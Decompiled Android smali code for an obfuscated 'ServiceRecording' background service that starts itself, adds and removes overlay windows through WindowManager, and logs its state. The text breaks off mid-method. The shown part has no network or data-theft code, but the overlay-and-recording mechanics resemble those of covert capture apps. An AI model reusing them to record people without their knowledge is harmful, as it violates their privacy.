.class public Lcom/utils/services/ServiceRecording;
.super Landroid/app/Service;
.source ""


# static fields
.field public static d:Landroid/os/Handler;

.field private static e:Lcom/utils/services/ServiceRecording;

.field private static f:[Lcom/utils/services/b;


# instance fields
.field public a:Landroid/os/Bundle;

.field private b:Z

.field private c:Landroid/app/Notification;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    sput-object v0, Lcom/utils/services/ServiceRecording;->d:Landroid/os/Handler;

    const/4 v0, 0x0

    sput-object v0, Lcom/utils/services/ServiceRecording;->e:Lcom/utils/services/ServiceRecording;

    const/4 v0, 0x2

    new-array v0, v0, [Lcom/utils/services/b;

    new-instance v1, Lcom/utils/services/b;

    const/16 v2, 0xa

    invoke-direct {v1, v2}, Lcom/utils/services/b;-><init>(I)V

    const/4 v2, 0x0

    aput-object v1, v0, v2

    new-instance v1, Lcom/utils/services/b;

    const/16 v2, 0x12c

    invoke-direct {v1, v2}, Lcom/utils/services/b;-><init>(I)V

    const/4 v2, 0x1

    aput-object v1, v0, v2

    sput-object v0, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/utils/services/ServiceRecording;->a:Landroid/os/Bundle;

    const/4 v1, 0x0

    iput-boolean v1, p0, Lcom/utils/services/ServiceRecording;->b:Z

    iput-object v0, p0, Lcom/utils/services/ServiceRecording;->c:Landroid/app/Notification;

    return-void
.end method

.method public static a()V
    .locals 2

    sget-object v0, Lcom/utils/services/ServiceRecording;->e:Lcom/utils/services/ServiceRecording;

    if-eqz v0, :cond_0

    sget-object v0, Lcom/utils/services/ServiceRecording;->d:Landroid/os/Handler;

    new-instance v1, Lcom/utils/services/c;

    invoke-direct {v1}, Lcom/utils/services/c;-><init>()V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :cond_0
    return-void
.end method

.method private static a(I)V
    .locals 3

    const-string v0, "SrvR"

    :try_start_0
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Lcom/utils/services/d;->values()[Lcom/utils/services/d;

    move-result-object v2

    aget-object v2, v2, p0

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v2, " cancel: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v2, v2, p0

    iget-object v2, v2, Lcom/utils/services/b;->d:Lb/d/c/i;

    invoke-virtual {v2}, Lb/d/c/i;->a()Lb/d/c/h;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v2, " "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v2, v2, p0

    invoke-virtual {v2}, Lcom/utils/services/b;->a()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lb/d/c/d0;->b(Ljava/lang/String;Ljava/lang/String;)V

    sget-object v1, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v1, v1, p0

    iget-object v1, v1, Lcom/utils/services/b;->d:Lb/d/c/i;

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Lb/d/c/i;->a(Z)Z

    sget-object v1, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object p0, v1, p0

    const/4 v1, 0x0

    iput-object v1, p0, Lcom/utils/services/b;->d:Lb/d/c/i;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    const-string v1, "cT"

    invoke-static {v0, v1, p0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :goto_0
    return-void
.end method

.method private a(II)V
    .locals 4

    const-string v0, "SrvR"

    :try_start_0
    sget-object v1, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v1, v1, p1

    iget-object v1, v1, Lcom/utils/services/b;->c:[Landroid/view/View;

    aget-object v1, v1, p2

    if-nez v1, :cond_1

    sget-object v1, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v1, v1, p1

    iget-object v1, v1, Lcom/utils/services/b;->c:[Landroid/view/View;

    new-instance v2, Landroid/widget/LinearLayout;

    invoke-direct {v2, p0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    aput-object v2, v1, p2

    invoke-static {p2}, Lcom/utils/core/u;->a(I)Landroid/view/WindowManager$LayoutParams;

    move-result-object v1

    const-string v2, "window"

    invoke-virtual {p0, v2}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/WindowManager;

    sget-object v3, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v3, v3, p1

    iget-object v3, v3, Lcom/utils/services/b;->c:[Landroid/view/View;

    aget-object v3, v3, p2

    invoke-interface {v2, v3, v1}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    const-wide/16 v1, 0x64

    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "+V "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v2, "*"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v2, ": "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v2, v2, p1

    iget-object v2, v2, Lcom/utils/services/b;->c:[Landroid/view/View;

    aget-object v2, v2, p2

    if-nez v2, :cond_0

    const-string p1, "null"

    goto :goto_0

    :cond_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v3, v3, p1

    iget-object v3, v3, Lcom/utils/services/b;->c:[Landroid/view/View;

    aget-object v3, v3, p2

    invoke-virtual {v3}, Landroid/view/View;->getWindowToken()Landroid/os/IBinder;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v3, " pr:"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object p1, v3, p1

    iget-object p1, p1, Lcom/utils/services/b;->c:[Landroid/view/View;

    aget-object p1, p1, p2

    invoke-virtual {p1}, Landroid/view/View;->getParent()Landroid/view/ViewParent;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    :goto_0
    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception p1

    const-string p2, "bb"

    invoke-static {v0, p2, p1}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_1
    :goto_1
    return-void
.end method

.method public static a(Lcom/utils/services/d;)V
    .locals 2

    const/4 v0, 0x0

    const/4 v1, 0x0

    invoke-static {p0, v0, v1}, Lcom/utils/services/ServiceRecording;->a(Lcom/utils/services/d;ZLandroid/os/Bundle;)V

    return-void
.end method

.method public static a(Lcom/utils/services/d;Landroid/os/Bundle;)V
    .locals 1

    invoke-static {}, Lcom/utils/receivers/ReceiverSubOut;->a()V

    const/4 v0, 0x1

    invoke-static {p0, v0, p1}, Lcom/utils/services/ServiceRecording;->a(Lcom/utils/services/d;ZLandroid/os/Bundle;)V

    return-void
.end method

.method private static a(Lcom/utils/services/d;ZLandroid/os/Bundle;)V
    .locals 6

    invoke-virtual {p0}, Ljava/lang/Enum;->name()Ljava/lang/String;

    move-result-object v0

    const-string v1, "SrvR"

    if-eqz p1, :cond_2

    const/4 v2, 0x0

    .line 1
    :try_start_0
    invoke-virtual {p0}, Ljava/lang/Enum;->ordinal()I

    move-result v3

    sget-object v4, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v4, v4, v3

    iget-object v4, v4, Lcom/utils/services/b;->d:Lb/d/c/i;

    if-eqz v4, :cond_1

    sget-object v4, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v4, v4, v3

    iget-object v4, v4, Lcom/utils/services/b;->d:Lb/d/c/i;

    invoke-virtual {v4}, Lb/d/c/i;->a()Lb/d/c/h;

    move-result-object v4

    sget-object v5, Lb/d/c/h;->b:Lb/d/c/h;

    if-ne v4, v5, :cond_0

    sget-object v4, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v4, v4, v3

    invoke-virtual {v4}, Lcom/utils/services/b;->b()Z

    move-result v4

    if-nez v4, :cond_0

    const/4 v2, 0x1

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string p0, " allready started "

    invoke-virtual {v4, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object p0, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object p0, p0, v3

    invoke-virtual {p0}, Lcom/utils/services/b;->a()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v4, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {v1, p0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    :cond_0
    invoke-static {v3}, Lcom/utils/services/ServiceRecording;->a(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    const-string v3, "iRt"

    invoke-static {v1, v3, p0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_1
    :goto_0
    if-nez v2, :cond_5

    .line 2
    :cond_2
    :try_start_1
    new-instance p0, Landroid/content/Intent;

    sget-object v2, Lcom/utils/core/CoreApplication;->a:Landroid/content/Context;

    const-class v3, Lcom/utils/services/ServiceRecording;

    invoke-direct {p0, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v2, "INTENT_FUNC_KEY"

    invoke-virtual {p0, v2, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    if-nez p1, :cond_3

    const-string p1, "INTENT_STOP_KEY"

    const-string v0, "stop"

    invoke-virtual {p0, p1, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    :cond_3
    if-eqz p2, :cond_4

    const-string p1, "INTENT_PARAM"

    invoke-virtual {p0, p1, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Bundle;)Landroid/content/Intent;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_4

    :cond_4
    :try_start_2
    sget-object p1, Lcom/utils/core/CoreApplication;->a:Landroid/content/Context;

    invoke-virtual {p1, p0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_2
    .catch Ljava/lang/IllegalStateException; {:try_start_2 .. :try_end_2} :catch_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_2

    :catch_1
    move-exception p0

    :try_start_3
    const-string p1, "runSrE"

    :goto_1
    invoke-static {v1, p1, p0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    goto :goto_2

    :catch_2
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_4

    const/16 p2, 0x1a

    if-lt p1, p2, :cond_5

    :try_start_4
    sget-object p1, Lcom/utils/core/CoreApplication;->a:Landroid/content/Context;

    invoke-virtual {p1, p0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    goto :goto_2

    :catch_3
    move-exception p0

    :try_start_5
    const-string p1, "runSrF"
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_4

    goto :goto_1

    :catch_4
    move-exception p0

    const-string p1, "runSr"

    invoke-static {v1, p1, p0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_5
    :goto_2
    return-void
.end method

.method static synthetic a(Z)V
    .locals 0

    invoke-static {p0}, Lcom/utils/services/ServiceRecording;->c(Z)V

    return-void
.end method

.method private b(Z)Ljava/lang/String;
    .locals 9

    const-string v0, " "

    const-string v1, "SrvR"

    const/4 v2, 0x0

    const-string v3, ""

    move-object v5, v3

    const/4 v4, 0x0

    :goto_0
    :try_start_0
    sget-object v6, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    array-length v6, v6

    if-ge v2, v6, :cond_4

    sget-object v6, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v6, v6, v2

    iget-object v6, v6, Lcom/utils/services/b;->d:Lb/d/c/i;

    if-eqz v6, :cond_2

    sget-object v6, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v6, v6, v2

    invoke-virtual {v6}, Lcom/utils/services/b;->b()Z

    move-result v6

    if-eqz v6, :cond_0

    invoke-static {v2}, Lcom/utils/services/ServiceRecording;->a(I)V

    goto :goto_2

    :cond_0
    sget-object v6, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v6, v6, v2

    iget-object v6, v6, Lcom/utils/services/b;->d:Lb/d/c/i;

    if-eqz v6, :cond_2

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v7, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v7, v7, v2

    iget-object v7, v7, Lcom/utils/services/b;->d:Lb/d/c/i;

    invoke-virtual {v7}, Lb/d/c/i;->a()Lb/d/c/h;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    const-string v7, " RUNNING"

    invoke-virtual {v6, v7, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    if-ne v5, v3, :cond_1

    move-object v8, v3

    goto :goto_1

    :cond_1
    const-string v8, "; "

    :goto_1
    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {}, Lcom/utils/services/d;->values()[Lcom/utils/services/d;

    move-result-object v8

    aget-object v8, v8, v2

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v8, ": "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v8, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v8, v8, v2

    invoke-virtual {v8}, Lcom/utils/services/b;->a()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    :cond_2
    :goto_2
    sget-object v6, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v6, v6, v2

    iget-object v6, v6, Lcom/utils/services/b;->d:Lb/d/c/i;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-nez v6, :cond_3

    add-int/lit8 v4, v4, 0x1

    :cond_3
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :catch_0
    move-exception v2

    const-string v6, "cFt"

    invoke-static {v1, v6, v2}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_4
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "s:"

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v6, " l:"

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    array-length v6, v6

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V

    if-eqz p1, :cond_5

    sget-object p1, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    array-length p1, p1

    if-ne v4, p1, :cond_5

    invoke-static {}, Lcom/utils/services/ServiceRecording;->b()V

    :cond_5
    invoke-static {v5}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_6

    goto :goto_3

    :cond_6
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "["

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "]"

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    :goto_3
    return-object v3
.end method

.method public static b()V
    .locals 3

    :try_start_0
    sget-object v0, Lcom/utils/services/ServiceRecording;->e:Lcom/utils/services/ServiceRecording;

    if-eqz v0, :cond_0

    sget-object v0, Lcom/utils/services/ServiceRecording;->e:Lcom/utils/services/ServiceRecording;

    invoke-direct {v0}, Lcom/utils/services/ServiceRecording;->d()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "SrvR"

    const-string v2, "fS"

    invoke-static {v1, v2, v0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_0
    :goto_0
    return-void
.end method

.method private static b(I)V
    .locals 4

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "b:"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "SrvR"

    invoke-static {v1, v0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_0
    sget-object v0, Lcom/utils/services/ServiceRecording;->e:Lcom/utils/services/ServiceRecording;

    sget-object v2, Lcom/utils/services/d;->b:Lcom/utils/services/d;

    invoke-virtual {v2}, Ljava/lang/Enum;->ordinal()I

    move-result v2

    invoke-direct {v0, v2, p0}, Lcom/utils/services/ServiceRecording;->a(II)V

    sget-object v0, Lcom/utils/services/d;->b:Lcom/utils/services/d;

    invoke-virtual {v0}, Ljava/lang/Enum;->ordinal()I

    move-result v0

    invoke-static {v0, p0}, Lcom/utils/services/ServiceRecording;->c(II)Z

    move-result v0

    if-eqz v0, :cond_1

    sget-object v0, Lcom/utils/services/ServiceRecording;->e:Lcom/utils/services/ServiceRecording;

    sget-object v2, Lcom/utils/services/d;->b:Lcom/utils/services/d;

    invoke-virtual {v2}, Ljava/lang/Enum;->ordinal()I

    move-result v2

    invoke-direct {v0, v2, p0}, Lcom/utils/services/ServiceRecording;->b(II)V

    const-string v0, "wrn "

    invoke-static {v0}, Lb/a/a/a/a;->a(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v2, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    const/4 v3, 0x1

    aget-object v2, v2, v3

    iget-object v2, v2, Lcom/utils/services/b;->c:[Landroid/view/View;

    aget-object v2, v2, p0

    invoke-virtual {v2}, Landroid/view/View;->getParent()Landroid/view/ViewParent;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Lb/d/c/d0;->b(Ljava/lang/String;Ljava/lang/String;)V

    :cond_1
    sget-object v0, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    sget-object v2, Lcom/utils/services/d;->b:Lcom/utils/services/d;

    invoke-virtual {v2}, Ljava/lang/Enum;->ordinal()I

    move-result v2

    aget-object v0, v0, v2

    iget-boolean v0, v0, Lcom/utils/services/b;->e:Z

    if-nez v0, :cond_2

    sget-object v0, Lcom/utils/services/d;->b:Lcom/utils/services/d;

    invoke-virtual {v0}, Ljava/lang/Enum;->ordinal()I

    move-result v0

    invoke-static {v0, p0}, Lcom/utils/services/ServiceRecording;->c(II)Z

    move-result v0

    if-nez v0, :cond_0

    :cond_2
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "e:"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {v1, p0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method private b(II)V
    .locals 3

    const-string v0, "SrvR"

    sget-object v1, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v1, v1, p1

    iget-object v1, v1, Lcom/utils/services/b;->c:[Landroid/view/View;

    aget-object v1, v1, p2

    if-eqz v1, :cond_0

    :try_start_0
    const-string v1, "window"

    invoke-virtual {p0, v1}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/WindowManager;

    sget-object v2, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v2, v2, p1

    iget-object v2, v2, Lcom/utils/services/b;->c:[Landroid/view/View;

    aget-object v2, v2, p2

    invoke-interface {v1, v2}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    sget-object v1, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v1, v1, p1

    iget-object v1, v1, Lcom/utils/services/b;->c:[Landroid/view/View;

    aget-object v1, v1, p2

    invoke-virtual {v1}, Landroid/view/View;->destroyDrawingCache()V

    sget-object v1, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v1, v1, p1

    iget-object v1, v1, Lcom/utils/services/b;->c:[Landroid/view/View;

    const/4 v2, 0x0

    aput-object v2, v1, p2

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "-V "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p1, "*"

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    const-string p2, "db"

    invoke-static {v0, p2, p1}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_0
    :goto_0
    return-void
.end method

.method public static c()Ljava/lang/String;
    .locals 2

    sget-object v0, Lcom/utils/services/ServiceRecording;->e:Lcom/utils/services/ServiceRecording;

    if-eqz v0, :cond_0

    iget-object v0, v0, Lcom/utils/services/ServiceRecording;->a:Landroid/os/Bundle;

    if-eqz v0, :cond_0

    const-string v1, "file"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    return-object v0
.end method

.method private static c(Z)V
    .locals 7

    const-string v0, " "

    const-string v1, "cb"

    const-string v2, "SrvR"

    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x17

    if-lt v3, v4, :cond_8

    :try_start_0
    sget-object v3, Lcom/utils/services/d;->b:Lcom/utils/services/d;

    invoke-virtual {v3}, Ljava/lang/Enum;->ordinal()I

    move-result v3

    .line 1
    sget-object v4, Lcom/utils/services/ServiceRecording;->e:Lcom/utils/services/ServiceRecording;

    const/4 v5, 0x1

    const/4 v6, 0x0

    if-eqz v4, :cond_0

    sget-object v4, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v3, v4, v3

    iget-boolean v3, v3, Lcom/utils/services/b;->e:Z

    if-nez v3, :cond_0

    const/4 v3, 0x1

    goto :goto_0

    :cond_0
    const/4 v3, 0x0

    :goto_0
